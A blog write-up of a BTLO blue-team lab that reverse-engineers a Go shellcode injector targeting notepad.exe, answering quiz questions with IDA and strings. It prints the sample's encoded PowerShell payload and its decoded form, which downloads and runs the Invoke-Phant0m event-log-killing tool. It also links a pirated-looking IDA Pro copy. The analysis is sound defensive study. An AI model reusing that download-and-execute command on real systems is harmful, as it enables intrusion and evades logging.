---
layout: post
title: Reverse Engineering - Another Injection
date: 2024-01-26 18:00 +0700
categories: [BTLO, Reverse Engineering]
tags: [Disassembler, API Monitor, Sysinternals, Malware Analysis, Blue Team, btlo, Reverse, IDA]     # TAG names should always be lowercase
img_path: '/assets/BTLO/Reverse_Engineering_Another_Injection'
image: 
  path: logo.png
--- 

Good morning everyone XD

Don't ignore the warning .-.

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/8e86824a-808f-4202-9d2b-2c571d4ed3cb)

### What is the language the program is written? (1 points)

Can use `IDA` or `PE studio`, this time I will use `IDA` so I will guide you to use [IDA pro](https://github.com/Lynx305/IDA-Pro-7.7) to download and use

Please import the file and go to the `Hex View-1`

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/ffd77a15-ef44-419e-a939-6292f7f59f27)

`Go lang`

### What is the build id? (1 points)

`eck19EyXq_9c975RxNJ1/QkbhfvYWoTcAeJreFwhX/q3HwQW17YdD3iMlLFCzB/1ZpNy-9ah0QEvzlOTFcq`

### What is the dependency package the sample uses for invoking windows APIs (1 points)

yes, that's it .-.

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/5ecca864-f0ef-4722-bc8b-67e4e950571c)

`github.com/TheTitanrain/w32`

### What is the victim process? (Hint: 32bit) (2 points)

Easy, right? :)
>Nooooooo!!!, it took me all day just to realize it needs to launch itself or be injected. Yes, challenge title ;))))))))

```
strings main.exe | grep .exe

```

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/c7e682da-7944-4ce6-931e-78c31cab6a30)

`notepad.exe`


### What is the process invoked from the shellcode? (1 points)

What do you think about shellcode -> powershell
>too fast XD

```
strings main.exe | grep powershell

```

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/44063657-05a0-4bfa-87c2-85fbd36aea08)

`powershell`

### What is the name of the created file? (2 points)

Go ahead, let's get it decoded [CyberChef](https://gchq.github.io/CyberChef/)

```
SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGgAbABsAGQAegAvAEkAbgB2AG8AawBlAC0AUABoAGEAbgB0ADAAbQAvAG0AYQBzAHQAZQByAC8ASQBuAHYAbwBrAGUALQBQAGgAYQBuAHQAMABtAC4AcABzADEAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABjAGgAYQBuAGcAZQAuAHAAcwAxACIAOwAgAEkAbQBwAG8AcgB0AC0ATQBvAGQAdQBsAGUAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAGMAaABhAG4AZwBlAC4AcABzADEAOwBJAG4AdgBvAGsAZQAtAFAAaABhAG4AdAAwAG0AOwA=

```
![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/fda0e032-3a94-4761-b97a-0160d1ea3a56)

Now just remove the spaces

`Invoke-WebRequest "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/master/Invoke-Phant0m.ps1" -OutFile "C:\Windows\Temp\change.ps1"; Import-Module C:\Windows\Temp\change.ps1;Invoke-Phant0m;`

OK, got the answer ~

`C:\Windows\Temp\change.ps1`

### What is the name of the actual tool executed? (2 points)

`Invoke-Phant0m` 

goodbye, thank you for reading until now //~//


